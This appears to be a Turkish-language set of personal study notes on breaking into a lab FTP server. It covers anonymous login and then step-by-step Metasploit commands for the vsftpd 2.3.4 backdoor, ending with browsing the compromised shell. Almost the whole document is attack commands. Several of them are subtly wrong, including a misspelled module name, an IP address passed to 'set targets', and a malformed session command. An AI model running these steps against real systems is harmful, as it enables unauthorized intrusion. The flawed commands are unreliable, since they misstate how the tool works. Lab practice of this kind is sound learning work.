# ftp Açığı
---
```ftp 192.168.123.123``` çalıştırıyoruz, kullanıcı adı ve şifre yerine "anonymous" yazıyoruz

* ftp açığına bağlandıktan sonra ```put dosyaadı``` ile dosya ekleyebiliriz
* Google'a nmap'te bulunan ```vsftpd A.B.C (vsftpd 2.3.4) exploit``` yazarak gerekli komutlara ulaşabiliriz

# msfconsole ile açıktan giriş
---
#### 1. ```msfconsole``` çalıştırıyoruz
#### 2. ```msf > use exploit/unix/ftp/usftp_234_backdoor```
#### 3. ```show targets```
#### 4. ```set targets 192.168.123.123``` hedef IP
#### 5. ```show options```
#### 6. ```set RHOST 192.168.123.123``` hedef IP
#### 7. ```set RPORT 21``` port'u değiştiriyoruz
#### 8. ```exploit -j -z``` dinleyeme başlıyoruz ```-j -z``` dersek dinlemeyi arka planda yapar
#### 9. ```sessions -l``` açık olan portları görürüz
#### 10. ```session 1``` 1. session açık olduğu için o porttan giriş yapar

# Giriş yaptıktan sonra
---
#### ```uname -a``` içinde olduğumuz sistemin adını verir
#### ```ls, pwd``` gibi komutlarla sistemde gezinebiliriz
#### ```background``` ile sistemden çıkış yaparız
